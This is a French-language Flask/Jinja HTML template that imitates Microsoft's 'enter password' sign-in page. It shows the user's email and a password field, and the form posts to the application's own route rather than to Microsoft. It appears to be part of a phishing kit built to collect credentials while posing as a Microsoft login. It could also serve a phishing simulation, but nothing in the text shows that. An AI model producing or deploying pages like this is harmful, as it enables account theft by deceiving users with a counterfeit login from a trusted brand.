<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Entrer le mot de passe — Microsoft</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <a href="/back">Retour</a>

      <h1>Entrer le mot de passe</h1>

   <form method="POST" action="{{ url_for('password') }}">

  <p class="email-display">{{ email }}</p>

  <div class="field">
    <input type="password"
           name="password"
           placeholder="Mot de passe"
           autocomplete="current-password"
           autofocus>
  </div>

  {% if error %}
    <p class="error">{{ error }}</p>
  {% endif %}

  <div class="actions">
    <button type="submit" class="btn-primary">
      Se connecter
    </button>
  </div>

</form>
      
    </div>

    <div class="footer">
      <a href="#">Conditions d'utilisation</a>
      <a href="#">Confidentialité et cookies</a>
    </div>
  </div>
</body>
</html>
